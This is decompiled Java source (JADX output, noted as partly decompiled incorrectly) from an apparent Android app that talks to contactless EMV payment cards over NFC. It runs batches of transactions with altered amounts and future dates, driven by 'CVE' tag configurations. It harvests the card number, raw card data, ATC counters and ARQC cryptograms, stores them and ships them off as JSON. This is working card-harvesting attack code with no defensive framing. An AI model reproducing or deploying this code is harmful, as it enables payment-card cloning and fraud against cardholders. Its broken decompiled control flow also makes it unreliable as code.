package B2;

import a2.C0062a;
import android.nfc.tech.IsoDep;
import e2.AbstractC0139v;
import e2.B;
import e2.InterfaceC0137t;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;
import m0.z;
import org.json.JSONArray;
import org.json.JSONObject;
import xyz.happify.ckemv.CardRecord;
import xyz.happify.ckemv.CveConfig;
import xyz.happify.ckemv.EmvKernel;
import xyz.happify.ckemv.HarvestedTx;
import xyz.happify.ckemv.MainActivity;

/* loaded from: classes.dex */
public final class q extends Q1.g implements W1.p {

    /* renamed from: f, reason: collision with root package name */
    public Object f93f;
    public int g;
    public final /* synthetic */ MainActivity h;

    /* renamed from: i, reason: collision with root package name */
    public final /* synthetic */ IsoDep f94i;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public q(MainActivity mainActivity, IsoDep isoDep, O1.d dVar) {
        super(2, dVar);
        this.h = mainActivity;
        this.f94i = isoDep;
    }

    @Override // Q1.b
    public final O1.d b(O1.d dVar, Object obj) {
        return new q(this.h, this.f94i, dVar);
    }

    @Override // W1.p
    public final Object e(Object obj, Object obj2) {
        return ((q) b((O1.d) obj2, (InterfaceC0137t) obj)).k(K1.h.f605a);
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:113:0x02f2  */
    /* JADX WARN: Removed duplicated region for block: B:117:0x0307 A[LOOP:2: B:64:0x0192->B:117:0x0307, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:118:0x0326 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:186:0x04aa A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:187:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Type inference failed for: r0v35, types: [B2.a] */
    /* JADX WARN: Type inference failed for: r0v40, types: [org.json.JSONObject] */
    /* JADX WARN: Type inference failed for: r3v1 */
    /* JADX WARN: Type inference failed for: r3v11 */
    /* JADX WARN: Type inference failed for: r3v12 */
    /* JADX WARN: Type inference failed for: r3v13 */
    /* JADX WARN: Type inference failed for: r3v14 */
    /* JADX WARN: Type inference failed for: r3v2 */
    /* JADX WARN: Type inference failed for: r3v20, types: [xyz.happify.ckemv.CardRecord] */
    /* JADX WARN: Type inference failed for: r3v28 */
    /* JADX WARN: Type inference failed for: r3v29 */
    /* JADX WARN: Type inference failed for: r3v3, types: [O1.d, B2.q] */
    /* JADX WARN: Type inference failed for: r3v36, types: [a2.a, a2.c] */
    /* JADX WARN: Type inference failed for: r3v4 */
    /* JADX WARN: Type inference failed for: r3v5, types: [O1.d, B2.q] */
    /* JADX WARN: Type inference failed for: r3v51 */
    /* JADX WARN: Type inference failed for: r3v6 */
    /* JADX WARN: Type inference failed for: r3v9 */
    @Override // Q1.b
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object k(Object obj) {
        ?? r3;
        P1.a aVar;
        K1.h hVar;
        f2.d dVar;
        p pVar;
        byte[] bArr;
        P1.a aVar2;
        String str;
        String str2;
        String str3;
        String str4;
        q qVar;
        ?? r02;
        Map<String, String> visa_tags;
        int i3;
        SimpleDateFormat simpleDateFormat;
        Object obj2;
        String str5;
        int i4;
        Map<String, String> map;
        String message;
        EmvKernel emvKernel;
        q qVar2 = this;
        String str6 = "params";
        String str7 = "raw_data";
        P1.a aVar3 = P1.a.f784b;
        int i5 = qVar2.g;
        K1.h hVar2 = K1.h.f605a;
        IsoDep isoDep = qVar2.f94i;
        MainActivity mainActivity = qVar2.h;
        try {
            try {
                switch (i5) {
                    case 0:
                        z.m0(obj);
                        mainActivity.D.c(new Integer(0));
                        l2.d dVar2 = B.f2767a;
                        f2.d dVar3 = j2.o.f3534a;
                        m mVar = new m(mainActivity, null);
                        qVar2.g = 1;
                        if (AbstractC0139v.p(dVar3, mVar, qVar2) == aVar3) {
                            return aVar3;
                        }
                        break;
                    case 1:
                        z.m0(obj);
                        break;
                    case 2:
                        K1.h hVar3 = (K1.h) qVar2.f93f;
                        z.m0(obj);
                        return hVar3;
                    case 3:
                        K1.h hVar4 = (K1.h) qVar2.f93f;
                        z.m0(obj);
                        return hVar4;
                    case 4:
                    case 5:
                        z.m0(obj);
                        return hVar2;
                    case 6:
                        Throwable th = (Throwable) qVar2.f93f;
                        z.m0(obj);
                        throw th;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                isoDep.connect();
                isoDep.setTimeout(10000);
                a aVar4 = mainActivity.f5247A;
                String str8 = "dbHelper";
                if (aVar4 != null) {
                    ArrayList b3 = aVar4.b();
                    if (b3.isEmpty()) {
                        try {
                            isoDep.close();
                        } catch (Exception unused) {
                        }
                        l2.d dVar4 = B.f2767a;
                        f2.d dVar5 = j2.o.f3534a;
                        p pVar2 = new p(mainActivity, null);
                        qVar2.f93f = hVar2;
                        qVar2.g = 2;
                        return AbstractC0139v.p(dVar5, pVar2, qVar2) == aVar3 ? aVar3 : hVar2;
                    }
                    try {
                        bArr = isoDep.transceive(MainActivity.x(mainActivity, "00A404000E325041592E5359532E444446303100"));
                    } catch (Exception unused2) {
                        bArr = null;
                    }
                    String str9 = "";
                    String v3 = bArr != null ? MainActivity.v(mainActivity, bArr) : "";
                    String str10 = "Visa";
                    String str11 = d2.d.X(v3, "A000000003") ? "Visa" : d2.d.X(v3, "A000000004") ? "Mastercard" : "Unknown";
                    ArrayList arrayList = new ArrayList();
                    Iterator it = b3.iterator();
                    while (it.hasNext()) {
                        Object next = it.next();
                        CveConfig cveConfig = (CveConfig) next;
                        if ((X1.g.a(str11, "Visa") && (!cveConfig.getVisa_tags().isEmpty())) || (X1.g.a(str11, "Mastercard") && (!cveConfig.getMastercard_tags().isEmpty()))) {
                            arrayList.add(next);
                        }
                    }
                    if (arrayList.isEmpty()) {
                        try {
                            isoDep.close();
                        } catch (Exception unused3) {
                        }
                        l2.d dVar6 = B.f2767a;
                        f2.d dVar7 = j2.o.f3534a;
                        p pVar3 = new p(mainActivity, null);
                        qVar2.f93f = hVar2;
                        qVar2.g = 3;
                        return AbstractC0139v.p(dVar7, pVar3, qVar2) == aVar3 ? aVar3 : hVar2;
                    }
                    ArrayList arrayList2 = new ArrayList();
                    hVar = hVar2;
                    try {
                        SimpleDateFormat simpleDateFormat2 = new SimpleDateFormat("yyMMdd", Locale.CHINA);
                        int size = arrayList.size() * 20;
                        Iterator it2 = arrayList.iterator();
                        String str12 = "";
                        String str13 = str12;
                        String str14 = null;
                        int i6 = 0;
                        while (true) {
                            aVar2 = aVar3;
                            if (it2.hasNext()) {
                                try {
                                    try {
                                        CveConfig cveConfig2 = (CveConfig) it2.next();
                                        if (X1.g.a(str11, str10)) {
                                            try {
                                                visa_tags = cveConfig2.getVisa_tags();
                                            } catch (Exception unused4) {
                                                r3 = qVar2;
                                                aVar = aVar2;
                                                isoDep.close();
                                            } catch (Throwable th2) {
                                                th = th2;
                                                r3 = qVar2;
                                                aVar = aVar2;
                                                l2.d dVar8 = B.f2767a;
                                                dVar = j2.o.f3534a;
                                                pVar = new p(mainActivity, null);
                                                r3.f93f = th;
                                                r3.g = 6;
                                                if (AbstractC0139v.p(dVar, pVar, r3) == aVar) {
                                                }
                                            }
                                        } else {
                                            visa_tags = cveConfig2.getMastercard_tags();
                                        }
                                        Map<String, String> map2 = visa_tags;
                                        Iterator it3 = it2;
                                        int i7 = i6;
                                        int i8 = 3;
                                        String str15 = str14;
                                        str = str10;
                                        int i9 = 0;
                                        while (true) {
                                            if (i9 < i8) {
                                                if (i9 == 0 || i9 == 1) {
                                                    str5 = str12;
                                                    i4 = 8;
                                                } else {
                                                    str5 = str12;
                                                    i4 = 4;
                                                }
                                                str4 = str8;
                                                obj2 = str11;
                                                long amount = cveConfig2.getAmount();
                                                int i10 = 0;
                                                while (true) {
                                                    if (i10 < i4) {
                                                        i7++;
                                                        int i11 = i4;
                                                        i3 = size;
                                                        mainActivity.D.c(new Integer((i7 * 100) / size));
                                                        str2 = str6;
                                                        str3 = str7;
                                                        try {
                                                            long j3 = (amount * 95) / 100;
                                                            amount = j3 - Math.min(j3, u2.l.D(Y1.e.f1147b, new C0062a(1, 101, 1)));
                                                            if (amount >= 100) {
                                                                X1.g.e(map2, "<this>");
                                                                LinkedHashMap linkedHashMap = new LinkedHashMap(map2);
                                                                Calendar calendar = Calendar.getInstance();
                                                                calendar.add(6, i9);
                                                                String format = simpleDateFormat2.format(calendar.getTime());
                                                                X1.g.b(format);
                                                                linkedHashMap.put("9A", format);
                                                                map = map2;
                                                                try {
                                                                    simpleDateFormat = simpleDateFormat2;
                                                                    try {
                                                                        linkedHashMap.put("9F02", String.format("%012d", Arrays.copyOf(new Object[]{new Long(amount)}, 1)));
                                                                        String jSONObject = new JSONObject(linkedHashMap).toString();
                                                                        X1.g.d(jSONObject, "toString(...)");
                                                                        EmvKernel.INSTANCE.initialize(true, jSONObject);
                                                                        long currentTimeMillis = System.currentTimeMillis();
                                                                        while (true) {
                                                                            emvKernel = EmvKernel.INSTANCE;
                                                                            if (X1.g.a(emvKernel.getStatus(), "InProgress")) {
                                                                                String nextCommand = emvKernel.getNextCommand();
                                                                                if (nextCommand.length() != 0) {
                                                                                    byte[] transceive = isoDep.transceive(MainActivity.x(mainActivity, nextCommand));
                                                                                    X1.g.b(transceive);
                                                                                    emvKernel.processResponse(MainActivity.v(mainActivity, transceive));
                                                                                }
                                                                            }
                                                                        }
                                                                        double currentTimeMillis2 = System.currentTimeMillis() - currentTimeMillis;
                                                                        String atc = emvKernel.getAtc();
                                                                        if (atc.length() == 0) {
                                                                            atc = "N/A";
                                                                        }
                                                                        String str16 = atc;
                                                                        String arqc = emvKernel.getArqc();
                                                                        if (arqc.length() != 0) {
                                                                            String pan = emvKernel.getPan();
                                                                            if (pan.length() > 0) {
                                                                                str5 = pan;
                                                                            }
                                                                            String aid = emvKernel.getAid();
                                                                            if (aid.length() > 0) {
                                                                                str9 = aid;
                                                                            }
                                                                            String rawData = emvKernel.getRawData();
                                                                            if (rawData.length() > 0) {
                                                                                str13 = rawData;
                                                                            }
                                                                            arrayList2.add(new HarvestedTx(str16, arqc, currentTimeMillis2, emvKernel.getTxParameters(), cveConfig2.getId()));
                                                                        }
                                                                        i10++;
                                                                        str6 = str2;
                                                                        str7 = str3;
                                                                        size = i3;
                                                                        i4 = i11;
                                                                        map2 = map;
                                                                        simpleDateFormat2 = simpleDateFormat;
                                                                    } catch (Exception e3) {
                                                                        e = e3;
                                                                        message = e.getMessage();
                                                                        if (message == null) {
                                                                            message = "Lost connection to card";
                                                                        }
                                                                        str15 = message;
                                                                        str12 = str5;
                                                                        if (str15 == null) {
                                                                        }
                                                                    }
                                                                } catch (Exception e4) {
                                                                    e = e4;
                                                                    simpleDateFormat = simpleDateFormat2;
                                                                    message = e.getMessage();
                                                                    if (message == null) {
                                                                    }
                                                                    str15 = message;
                                                                    str12 = str5;
                                                                    if (str15 == null) {
                                                                    }
                                                                }
                                                            } else {
                                                                map = map2;
                                                                simpleDateFormat = simpleDateFormat2;
                                                            }
                                                        } catch (Exception e5) {
                                                            e = e5;
                                                            map = map2;
                                                        }
                                                    } else {
                                                        str3 = str7;
                                                        map = map2;
                                                        i3 = size;
                                                        simpleDateFormat = simpleDateFormat2;
                                                        str2 = str6;
                                                    }
                                                }
                                                str12 = str5;
                                                if (str15 == null) {
                                                    i9++;
                                                    str6 = str2;
                                                    str7 = str3;
                                                    str8 = str4;
                                                    str11 = obj2;
                                                    size = i3;
                                                    map2 = map;
                                                    simpleDateFormat2 = simpleDateFormat;
                                                    i8 = 3;
                                                }
                                            } else {
                                                str3 = str7;
                                                i3 = size;
                                                simpleDateFormat = simpleDateFormat2;
                                                str4 = str8;
                                                obj2 = str11;
                                                str2 = str6;
                                            }
                                        }
                                        if (str15 == null) {
                                            qVar2 = this;
                                            str6 = str2;
                                            str7 = str3;
                                            str10 = str;
                                            str14 = str15;
                                            aVar3 = aVar2;
                                            i6 = i7;
                                            it2 = it3;
                                            str8 = str4;
                                            str11 = obj2;
                                            size = i3;
                                            simpleDateFormat2 = simpleDateFormat;
                                        }
                                    } catch (Exception unused5) {
                                        r3 = this;
                                    }
                                } catch (Throwable th3) {
                                    th = th3;
                                    r3 = this;
                                    aVar = aVar2;
                                    l2.d dVar82 = B.f2767a;
                                    dVar = j2.o.f3534a;
                                    pVar = new p(mainActivity, null);
                                    r3.f93f = th;
                                    r3.g = 6;
                                    if (AbstractC0139v.p(dVar, pVar, r3) == aVar) {
                                        return aVar;
                                    }
                                    throw th;
                                }
                            } else {
                                str = str10;
                                str2 = str6;
                                str3 = str7;
                                str4 = str8;
                            }
                        }
                        String str17 = str9;
                        String str18 = str13;
                        try {
                            isoDep.close();
                        } catch (Exception unused6) {
                        }
                        if (!arrayList2.isEmpty()) {
                            try {
                                String str19 = d2.l.V(str17, "A000000003", false) ? str : d2.l.V(str17, "A000000004", false) ? "Mastercard" : "Unknown";
                                if (str12.length() == 0) {
                                    str12 = "Unknown PAN";
                                }
                                r3 = new CardRecord(str12, str17, str19, str18, arrayList2);
                                r02 = mainActivity.f5247A;
                            } catch (Throwable th4) {
                                th = th4;
                                r3 = this;
                                aVar = aVar2;
                                l2.d dVar822 = B.f2767a;
                                dVar = j2.o.f3534a;
                                pVar = new p(mainActivity, null);
                                r3.f93f = th;
                                r3.g = 6;
                                if (AbstractC0139v.p(dVar, pVar, r3) == aVar) {
                                }
                            }
                            try {
                                if (r02 == 0) {
                                    X1.g.h(str4);
                                    throw null;
                                }
                                long o3 = r02.o(r3);
                                a aVar5 = mainActivity.f5247A;
                                if (aVar5 == null) {
                                    X1.g.h(str4);
                                    throw null;
                                }
                                String i12 = aVar5.i();
                                if (i12 == null) {
                                    i12 = "no-key";
                                }
                                String str20 = i12;
                                ?? jSONObject2 = new JSONObject();
                                jSONObject2.put("pan", r3.getPan());
                                jSONObject2.put("aid", r3.getAid());
                                jSONObject2.put("network", r3.getNetwork());
                                jSONObject2.put("tx_count", r3.getTxs().size());
                                try {
                                    jSONObject2.put(str3, new JSONObject(r3.getRawData()));
                                } catch (Exception unused7) {
                                    jSONObject2.put(str3, r3.getRawData());
                                }
                                JSONArray jSONArray = new JSONArray();
                                for (HarvestedTx harvestedTx : r3.getTxs()) {
                                    JSONObject jSONObject3 = new JSONObject();
                                    jSONObject3.put("atc", harvestedTx.getAtc());
                                    jSONObject3.put("arqc", harvestedTx.getArqc());
                                    jSONObject3.put("time_ms", harvestedTx.getTimeMs());
                                    jSONObject3.put("cve_id", harvestedTx.getCve_id());
                                    try {
                                        jSONObject3.put(str2, new JSONObject(harvestedTx.getParams()));
                                    } catch (Exception unused8) {
                                        jSONObject3.put(str2, harvestedTx.getParams());
                                    }
                                    jSONArray.put(jSONObject3);
                                }
                                jSONObject2.put("harvested_txs", jSONArray);
                                qVar = this;
                                AbstractC0139v.k(AbstractC0139v.a(B.f2768b), 0, new o(jSONObject2, str20, qVar.h, o3, null), 3);
                            } catch (Exception unused9) {
                                aVar = aVar2;
                                isoDep.close();
                            } catch (Throwable th5) {
                                th = th5;
                                r3 = r3;
                                aVar = aVar2;
                                l2.d dVar8222 = B.f2767a;
                                dVar = j2.o.f3534a;
                                pVar = new p(mainActivity, null);
                                r3.f93f = th;
                                r3.g = 6;
                                if (AbstractC0139v.p(dVar, pVar, r3) == aVar) {
                                }
                            }
                        } else {
                            qVar = this;
                        }
                        l2.d dVar9 = B.f2767a;
                        f2.d dVar10 = j2.o.f3534a;
                        p pVar4 = new p(mainActivity, null);
                        qVar.g = 4;
                        return AbstractC0139v.p(dVar10, pVar4, qVar) == aVar2 ? aVar2 : hVar;
                    } catch (Exception unused10) {
                        r3 = qVar2;
                        aVar = aVar3;
                    }
                } else {
                    r3 = qVar2;
                    aVar = aVar3;
                    hVar = hVar2;
                    try {
                        try {
                            X1.g.h("dbHelper");
                            throw null;
                        } catch (Exception unused11) {
                        }
                    } catch (Throwable th6) {
                        th = th6;
                        l2.d dVar82222 = B.f2767a;
                        dVar = j2.o.f3534a;
                        pVar = new p(mainActivity, null);
                        r3.f93f = th;
                        r3.g = 6;
                        if (AbstractC0139v.p(dVar, pVar, r3) == aVar) {
                        }
                    }
                }
            } catch (Exception unused12) {
                r3 = qVar2;
                aVar = aVar3;
                hVar = hVar2;
            }
            try {
                isoDep.close();
            } catch (Exception unused13) {
                l2.d dVar11 = B.f2767a;
                f2.d dVar12 = j2.o.f3534a;
                p pVar5 = new p(mainActivity, null);
                r3.g = 5;
                return AbstractC0139v.p(dVar12, pVar5, r3) == aVar ? aVar : hVar;
            }
        } catch (Throwable th7) {
            th = th7;
            r3 = qVar2;
            aVar = aVar3;
        }
    }
}
